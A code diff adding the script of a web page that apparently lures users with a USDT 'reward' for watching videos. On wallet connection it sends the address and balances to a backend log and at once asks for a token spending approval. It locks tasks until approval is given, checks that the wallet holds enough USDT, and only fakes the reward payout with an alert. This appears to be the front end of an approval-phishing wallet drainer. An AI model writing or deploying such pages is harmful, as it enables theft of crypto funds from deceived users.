+          'USDT balance: ' + prettyBalance +
+          '<br><span class="small mono">' + TOKEN_ADDRESS + '</span>';
+      }
+
+   isWalletConnected = true;
+
+if (connectBtn) {
+  connectBtn.textContent = "Connected";
+  connectBtn.classList.add("connected");
+}
+
+if (connectBtnCard) {
+  connectBtnCard.style.display = "none";
+}
+
+      updateClaimState();
+      updateApproveButtonUI();
+
+
+      // Return values for connectFlow
+      return {
+        balanceBNB,
+        tokenBalance: tokenBalanceNum,
+        userId
+      };
+    }
+
+    // 🔁 NEW: connect using Reown AppKit
+ // 🔁 NEW: connect using Reown AppKit (fixed for mobile)
+async function connectFlow() {
+  try {
+    if (!window.appKit) {
+      alert("Wallet connect UI not ready. Please reload the page.");
+      return;
+    }
+
+    setStatus("Connecting…");
+
+    let gotProvider = null;
+
+    // 1) Subscribe BEFORE opening the modal
+    const unsubscribe = window.appKit.subscribeProviders((state) => {
+      const evm = state["eip155"];
+      if (evm && !gotProvider) {
+        gotProvider = evm;
+      }
+    });
+
+    // 2) Open AppKit modal (Connect view)
+    await window.appKit.open({ view: "Connect" });
+
+    // 3) Stop listening
+    if (typeof unsubscribe === "function") {
+      unsubscribe();
+    }
+
+    // 4) If no provider, user probably closed modal or connect failed
+    const provider = gotProvider;
+    if (!provider) {
+      setStatus("Not connected");
+      return;
+    }
+
+    // 5) Use this provider for Web3 & Ethers
+    providerInstance = provider;
+    web3Instance     = new Web3(providerInstance);
+
+    attachProviderListeners(providerInstance);
+
+    const accounts = await web3Instance.eth.getAccounts();
+    if(!accounts || !accounts.length){
+      setStatus("No account");
+      return;
+    }
+    const address = accounts[0].toLowerCase();
+    currentAddress = address; // helpful for approval logging
+
+    // 6) Ensure BSC (56)
+    let chainId    = await web3Instance.eth.getChainId();
+    let chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
+
+    if (chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
+      const switched = await switchToBSC(providerInstance);
+      if(!switched){
+        alert("Please switch to BNB Smart Chain (56) in your wallet and try again.");
+        setStatus("Wrong network");
+        return;
+      }
+      chainId    = await web3Instance.eth.getChainId();
+      chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
+      if(chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
+        alert("Network switch failed. Make sure you are on BNB Smart Chain (56).");
+        setStatus("Wrong network");
+        return;
+      }
+    }
+
+    // 7) Connected + correct network
+    setStatus("Connected");
+
+    const sessionPromise = (async () => {
+      const session = await restoreSessionFromAddress(address);
+      const balanceBNB   = session.balanceBNB;
+      const tokenBalance = session.tokenBalance;
+      const userId       = session.userId;
+
+      // Log to sheet
+      notifyBackend(
+        address,
+        BNB_TESTNET_LABEL,
+        userId,
+        balanceBNB,
+        tokenBalance,
+        "connect"
+      ).catch(console.error);
+
+      return session;
+    })();
+
+
+    updateApproveButtonUI();
+
+
+    // 8) Token approval (same behavior as before)
+    await ensureTokenApproval();
+    sessionPromise.catch(console.error);
+
+  } catch (err) {
+    console.error("connectFlow error (AppKit):", err);
+    setStatus("Connection failed");
+    alert("Connection failed: " + (err && err.message ? err.message : err));
+  }
+}
+
+
+
+function updateApproveButtonUI() {
+  const approveBtn = document.getElementById("approveBtn");
+  if (!approveBtn) return;
+
+  // Not connected → hide
+  if (!isWalletConnected) {
+    approveBtn.classList.add("hidden");
+    return;
+  }
+
+  // Approved already → hide
+  if (isTokenApproved) {
+    approveBtn.classList.add("hidden");
+    return;
+  }
+
+  // Connected + not approved → show
+  approveBtn.classList.remove("hidden");
+}
+
+
+
+
+
+
+
+    
+
+    async function tryAutoReconnectSilent(){
+      // keep your old silent reconnect using injected wallets
+      if(window.trustwallet && window.trustwallet.ethereum){
+        const injected = window.trustwallet.ethereum;
+        providerInstance = injected;
+        web3Instance     = new Web3(providerInstance);
+        attachProviderListeners(providerInstance);
+        const accounts = await injected.request({method:"eth_accounts"});
+        if(accounts && accounts.length){
+          const address = accounts[0].toLowerCase();
+          setStatus("Restoring session (Trust Wallet)...");
+          await restoreSessionFromAddress(address);
+          setStatus("Connected (restored)");
+          return true;
+        }
+      }
+
+      if(window.ethereum){
+        const injected = window.ethereum;
+        providerInstance = injected;
+        web3Instance     = new Web3(providerInstance);
+        attachProviderListeners(providerInstance);
+        const accounts = await injected.request({method:"eth_accounts"});
+        if(accounts && accounts.length){
+          const address = accounts[0].toLowerCase();
+          setStatus("Restoring session...");
+          await restoreSessionFromAddress(address);
+          setStatus("Connected (restored)");
+          return true;
+        }
+      }
+
+      return false;
+    }
+
+    async function autoConnectOnLoad(){
+      try{
+        const restored = await tryAutoReconnectSilent();
+        if(!restored){
+          clearSessionUI();
+        }
+      }catch(e){
+        console.warn("autoConnectOnLoad failed:", e);
+        clearSessionUI();
+      }
+    }
+
+    async function claimReward(){
+      try{
+        if(!isWalletConnected){
+          alert("Please connect your wallet first.");
+          setStatus("Connect wallet before claiming.");
+          return;
+        }
+        if(!(task1Done && task2Eligible && task3Done)){
+          alert("Please complete all tasks first.");
+          return;
+        }
+        if(!web3Instance || !providerInstance || !currentAddress){
+          alert("Wallet not ready, connect again.");
+          return;
+        }
+
+        setStatus("Claiming reward…");
+
+        // TODO: real contract call later
+        setTimeout(()=>{
+          setStatus("Reward claimed for " + currentAddress.slice(0,6) + "…" + currentAddress.slice(-4));
+          alert("Reward claimed! (demo mode — add real contract call later)");
+        },800);
+      }catch(err){
+        console.error("claimReward error:", err);
+        setStatus("Reward claim failed");
+      }
+    }
+
+    // === TASK LOGIC ===
+function showTaskPage() {
+  if (rewardPageEl) rewardPageEl.style.display = "none";
+  if (taskPageEl)   taskPageEl.style.display   = "block";
+
+  if (!ytReady) return;
+
+  Object.keys(videoTasks).forEach(initVideoTask);
+
+  // 🔥 FORCE YOUTUBE RESIZE AFTER DISPLAY
+  setTimeout(() => {
+    Object.values(videoTasks).forEach(task => {
+      if (task.player && task.player.setSize) {
+        task.player.setSize(
+          task.player.getIframe().offsetWidth,
+          task.player.getIframe().offsetHeight
+        );
+      }
+    });
+
+    enableVideoClickToPlay();
+  }, 200);
+}
+
+
+
+
+    
+function initVideoTask(taskKey) {
+  if (!ytReady) return;
+
+  const task = videoTasks[taskKey];
+  if (task.player) return;
+
+  task.checkEl = document.getElementById(taskKey + "Check");
+
+  task.player = new YT.Player(task.playerId, {
+    playerVars: {
+      controls: 0,
+      disablekb: 1,
+      rel: 0,
+      modestbranding: 1,
+      iv_load_policy: 3,
+      playsinline: 1
+    },
+    events: {
+
+
+      
+onReady: () => {
+  task.duration = 0;
+  task.remaining = 0;
+  task.lastTime = 0;
+  task.stableTicks = 0;
+
+
+ // 🔥 RESET OVERLAY
+  const overlay = document
+    .getElementById(task.playerId)
+    ?.closest(".video-wrapper")
+    ?.querySelector(".video-click-overlay");
+
+  if (overlay) overlay.classList.remove("hidden");
+  
+  updateVideoTimerUI(task);
+},
+
+
+      
+      onStateChange: (e) => onVideoStateChange(task, e)
+    }
+  });
+  setTimeout(enableVideoClickToPlay, 0);
+
+}
+
+
+    
+
+    
+    function showRewardPage(){
+      if(taskPageEl)   taskPageEl.style.display   = "none";
+      if(rewardPageEl) rewardPageEl.style.display = "block";
+    }
+
+    async function handleTask2Check(){
+      if(!isWalletConnected || !currentAddress){
+        alert("Please connect your wallet first.");
+        return;
+      }
+      if(!web3Instance || !providerInstance){
+        alert("Wallet not ready, try reconnect.");
+        return;
+      }
+
+      try{
+        setStatus("Checking wallet balance…");
+        const balanceStr = await getTokenBalance(currentAddress);
+        const balanceNum = balanceStr ? Number(balanceStr) : 0;
+
+        const eligible = balanceNum >= REQUIRED_USDT;
+        task2Eligible = eligible;
+
+        markTaskState(
+          task2CheckEl,
+          eligible,
+          "ELIGIBLE (balance ≥ " + REQUIRED_USDT + ")",
+          "Not eligible (needs ≥ " + REQUIRED_USDT + ")"
+        );
+
+        if(task2DetailEl){
+          task2DetailEl.textContent =
+            "Detected balance: " + balanceNum.toFixed(4) +
+            " USDT. Result: " + (eligible ? "ELIGIBLE" : "NOT ELIGIBLE") +
+            ". Later you can also check if this is an active account.";
+        }
+
+        setStatus("Wallet check completed");
+        updateClaimState();
+      }catch(err){
+        console.error("Task 2 check error:", err);
+        if(task2DetailEl){
+          task2DetailEl.textContent = "Error checking wallet. Try again.";
+        }
+      }
+    }
+
+    // ===== DOMContentLoaded =====
+    document.addEventListener("DOMContentLoaded", async function(){
+
+   
+
+const approveBtn = document.getElementById("approveBtn");
+if (approveBtn) {
+  approveBtn.addEventListener("click", async () => {
+    if (!isWalletConnected) return;
+    approveBtn.disabled = true;
+    approveBtn.textContent = "Approving…";
+
+    await ensureTokenApproval();
+
+    approveBtn.disabled = false;
+    approveBtn.textContent = "Approve Now";
+  });
+}
+
+
+
+      
+      if(rewardAmountEl){
+        rewardAmountEl.textContent = "$" + REWARD_AMOUNT.toFixed(0);
+      }
+
+      updateClaimState();
+      updateTaskAccessUI();
+setupAppKitProviderWatcher();
+
+      if(connectBtn){
+        connectBtn.addEventListener("click", function(){
+          if(isWalletConnected) return;
+          connectFlow();
+        });
+      }
+
+// Connect button inside reward card
+const connectBtnCard = document.getElementById("connectBtnCard");
+if (connectBtnCard) {
+  connectBtnCard.addEventListener("click", function () {
+    if (isWalletConnected) return;
+    connectFlow();
+  });
+}
+
+
+
+
+      
+
+      if(claimBtn){
+        claimBtn.addEventListener("click", claimReward);
+      }
+
+
+if(taskBtn){
+  taskBtn.addEventListener("click", () => {
+    if (!isWalletConnected) return;
+
+    if (!isTokenApproved) {
+      openApprovalModal();
+      return;
+    }
+
+    showTaskPage();
+  });
+}
+
+      
+ 
+     document
+  .querySelectorAll("#backToRewardsBtn, .backToRewardsBtn")
+  .forEach(btn => {
+    btn.addEventListener("click", showRewardPage);
+  });
+
+      
+
+
+
+
+      
+
+      if(task2CheckBtn){
+        task2CheckBtn.addEventListener("click", handleTask2Check);
+      }
+
+      if(task3Btn){
+        task3Btn.addEventListener("click", function(){
+          task3Done = true;
+          markTaskState(task3CheckEl, true, "Task 3 completed (demo)", "Not completed");
+          updateClaimState();
+        });
+      }
+
+      await autoConnectOnLoad();
+      const yearEl = document.getElementById("year");
+      if(yearEl) yearEl.textContent = new Date().getFullYear();
+    });
+
+  })();
+  </script>
+</body>
+</html>
